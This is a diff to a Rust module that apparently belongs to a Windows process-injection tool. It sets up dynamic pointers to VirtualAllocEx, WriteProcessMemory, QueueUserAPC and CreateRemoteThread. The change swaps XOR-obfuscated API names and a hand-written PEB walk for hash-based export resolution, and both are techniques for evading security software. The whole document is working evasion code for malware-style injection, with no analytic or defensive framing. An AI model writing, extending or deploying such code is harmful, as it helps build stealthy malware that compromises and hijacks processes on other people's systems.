@@ -1,7 +1,15 @@
 #![allow(non_snake_case, dead_code)]
 
-use std::{mem, ptr, sync::OnceLock};
-use std::arch::asm;
+use std::{mem, sync::OnceLock};
+
+use crate::syscall::{
+    get_module_base_by_hash, resolve_export_by_hash,
+    H_KERNEL32,
+    H_VirtualAllocEx, H_VirtualFreeEx, H_WriteProcessMemory,
+    H_QueueUserAPC, H_ResumeThread, H_CreateProcessW,
+    H_WaitForSingleObject, H_OpenProcess, H_VirtualProtect,
+    H_CreateRemoteThread, H_CloseHandle, H_SetEnvironmentVariableW,
+};
 
 type FnVirtualAllocEx = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
 type FnVirtualFreeEx = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32) -> i32;
@@ -30,129 +38,29 @@ struct DynApis {
 
 static APIS: OnceLock<DynApis> = OnceLock::new();
 
-const XOR_KEY: u8 = 0x5E;
-
-const fn xor_enc(s: &[u8]) -> [u8; 32] {
-    let mut out = [0u8; 32];
-    let mut i = 0;
-    while i < s.len() && i < 31 {
-        out[i] = s[i] ^ XOR_KEY;
-        i += 1;
-    }
-    out
-}
-
-const VA_ENC: [u8; 32] = xor_enc(b"VirtualAllocEx");
-const VF_ENC: [u8; 32] = xor_enc(b"VirtualFreeEx");
-const WM_ENC: [u8; 32] = xor_enc(b"WriteProcessMemory");
-const QA_ENC: [u8; 32] = xor_enc(b"QueueUserAPC");
-const RT_ENC: [u8; 32] = xor_enc(b"ResumeThread");
-const CP_ENC: [u8; 32] = xor_enc(b"CreateProcessW");
-const WO_ENC: [u8; 32] = xor_enc(b"WaitForSingleObject");
-const OP_ENC: [u8; 32] = xor_enc(b"OpenProcess");
-const VP_ENC: [u8; 32] = xor_enc(b"VirtualProtect");
-const CRT_ENC: [u8; 32] = xor_enc(b"CreateRemoteThread");
-const CH_ENC: [u8; 32] = xor_enc(b"CloseHandle");
-const SETENV_ENC: [u8; 32] = xor_enc(b"SetEnvironmentVariableW");
-
-fn xor_decode(encoded: &[u8; 32]) -> [u8; 32] {
-    let mut out = [0u8; 32];
-    let mut i = 0;
-    while i < 32 {
-        if encoded[i] == 0 { break; }
-        out[i] = encoded[i] ^ XOR_KEY;
-        i += 1;
-    }
-    out
-}
-
-unsafe fn find_kernel32() -> Option<*mut u8> {
-    let peb: *mut u8;
-    asm!("mov {}, gs:[0x60]", out(reg) peb);
-    let ldr = *(peb.add(0x18) as *const *mut u8);
-    let flink = *(ldr.add(0x10) as *const *mut u8);
-    let mut entry = flink;
-    let head = ldr.add(0x10);
-    loop {
-        let dll_base = *(entry.add(0x30) as *const *mut u8);
-        if !dll_base.is_null() {
-            let name_ptr = *(entry.add(0x60) as *const *mut u16);
-            let mut name_buf = [0u16; 16];
-            ptr::copy_nonoverlapping(name_ptr, name_buf.as_mut_ptr(), 12);
-            let n = String::from_utf16_lossy(&name_buf).to_lowercase();
-            if n.contains("kernel32") {
-                return Some(dll_base);
-            }
-        }
-        let next = *(entry as *const *mut u8);
-        if next == head || next.is_null() { break; }
-        entry = next;
-    }
-    None
-}
-
-unsafe fn resolve_from_pe(base: *mut u8, name: &str) -> Option<*mut u8> {
-    let e_magic = *(base as *const u16);
-    let e_lfanew = *(base.add(0x3C) as *const i32);
-    if e_magic != 0x5A4D || e_lfanew <= 0 { return None; }
-    let nt = base.add(e_lfanew as usize);
-    let sig = *(nt as *const u32);
-    if sig != 0x00004550 { return None; }
-    let opt_hdr = nt.add(0x18);
-    let exp_rva = *(opt_hdr.add(0x70) as *const u32);
-    if exp_rva == 0 { return None; }
-    let exp = base.add(exp_rva as usize);
-    let num_names = *(exp.add(0x18) as *const u32);
-    let funcs = base.add(*(exp.add(0x1C) as *const u32) as usize);
-    let names = base.add(*(exp.add(0x20) as *const u32) as usize);
-    let ordinals = base.add(*(exp.add(0x24) as *const u32) as usize);
-    let name_bytes = name.as_bytes();
-    for i in 0..num_names as usize {
-        let name_ptr = base.add(*(names.add(i * 4) as *const u32) as usize);
-        let mut matched = true;
-        for (j, &b) in name_bytes.iter().enumerate() {
-            if *(name_ptr.add(j)) != b { matched = false; break; }
-        }
-        if matched && *(name_ptr.add(name_bytes.len())) == 0 {
-            let ord = *((ordinals as *const u16).add(i));
-            let func_rva = *(funcs.add(ord as usize * 4) as *const u32);
-            return Some(base.add(func_rva as usize));
-        }
-    }
-    None
-}
-
-fn xor_resolve(base: *mut u8, encoded: &[u8; 32]) -> Option<*mut u8> {
-    let decoded = xor_decode(encoded);
-    let end = decoded.iter().position(|&b| b == 0).unwrap_or(32);
-    let s = core::str::from_utf8(&decoded[..end]).ok()?;
-    unsafe { resolve_from_pe(base, s) }
+fn hash_resolve(module_hash: u32, export_hash: u32) -> Option<*mut u8> {
+    let base = get_module_base_by_hash(module_hash)?;
+    resolve_export_by_hash(base, export_hash)
 }
 
 fn init_apis() -> DynApis {
     unsafe {
-        let k32 = find_kernel32().expect("k32");
-        let va = mem::transmute(xor_resolve(k32, &VA_ENC).expect("va"));
-        let vf = mem::transmute(xor_resolve(k32, &VF_ENC).expect("vf"));
-        let wm = mem::transmute(xor_resolve(k32, &WM_ENC).expect("wm"));
-        let qa = mem::transmute(xor_resolve(k32, &QA_ENC).expect("qa"));
-        let rt = mem::transmute(xor_resolve(k32, &RT_ENC).expect("rt"));
-        let cp = mem::transmute(xor_resolve(k32, &CP_ENC).expect("cp"));
-        let wo = mem::transmute(xor_resolve(k32, &WO_ENC).expect("wo"));
-        let op = mem::transmute(xor_resolve(k32, &OP_ENC).expect("op"));
-        let cr = mem::transmute(xor_resolve(k32, &CRT_ENC).expect("crt"));
-        let ch = mem::transmute(xor_resolve(k32, &CH_ENC).expect("ch"));
+        macro_rules! resolve {
+            ($exp:expr) => {
+                mem::transmute(hash_resolve(H_KERNEL32, $exp).expect(stringify!($exp)))
+            };
+        }
         DynApis {
-            VirtualAllocEx: va,
-            VirtualFreeEx: vf,
-            WriteProcessMemory: wm,
-            QueueUserAPC: qa,
-            ResumeThread: rt,
-            CreateProcessW: cp,
-            WaitForSingleObject: wo,
-            OpenProcess: op,
-            CreateRemoteThread: cr,
-            CloseHandle: ch,
+            VirtualAllocEx:    resolve!(H_VirtualAllocEx),
+            VirtualFreeEx:     resolve!(H_VirtualFreeEx),
+            WriteProcessMemory: resolve!(H_WriteProcessMemory),
+            QueueUserAPC:      resolve!(H_QueueUserAPC),
+            ResumeThread:      resolve!(H_ResumeThread),
+            CreateProcessW:    resolve!(H_CreateProcessW),
+            WaitForSingleObject: resolve!(H_WaitForSingleObject),
+            OpenProcess:       resolve!(H_OpenProcess),
+            CreateRemoteThread: resolve!(H_CreateRemoteThread),
+            CloseHandle:       resolve!(H_CloseHandle),
         }
     }
 }
@@ -248,8 +156,9 @@ pub unsafe fn VirtualProtect(
     flnewprotect: u32,
     lpfloldprotect: *mut u32,
 ) -> i32 {
-    let k32 = find_kernel32().expect("k32");
-    let vp_fn: FnVirtualProtect = mem::transmute(xor_resolve(k32, &VP_ENC).expect("vp"));
+    let vp_fn: FnVirtualProtect = mem::transmute(
+        hash_resolve(H_KERNEL32, H_VirtualProtect).expect("VirtualProtect")
+    );
     (vp_fn)(lpaddress, dwsize, flnewprotect, lpfloldprotect)
 }
 
@@ -274,14 +183,11 @@ pub unsafe fn CloseHandle(
 }
 
 pub unsafe fn set_env_var(name: &str, value: &str) {
-    let k32 = match find_kernel32() { Some(b) => b, None => return };
-    let set_env_name = xor_decode(&SETENV_ENC);
-    let end = set_env_name.iter().position(|&b| b == 0).unwrap_or(32);
-    let set_env_str = core::str::from_utf8(&set_env_name[..end]).unwrap_or("SetEnvironmentVariableW");
-    let set_env_fn: unsafe extern "system" fn(*const u16, *const u16) -> i32 = match resolve_from_pe(k32, set_env_str) {
-        Some(p) => core::mem::transmute(p),
-        None => return,
-    };
+    let set_env_fn: unsafe extern "system" fn(*const u16, *const u16) -> i32 =
+        match hash_resolve(H_KERNEL32, H_SetEnvironmentVariableW) {
+            Some(p) => core::mem::transmute(p),
+            None => return,
+        };
     let mut name_w = [0u16; 256];
     let mut val_w = [0u16; 1024];
     let mut i = 0;
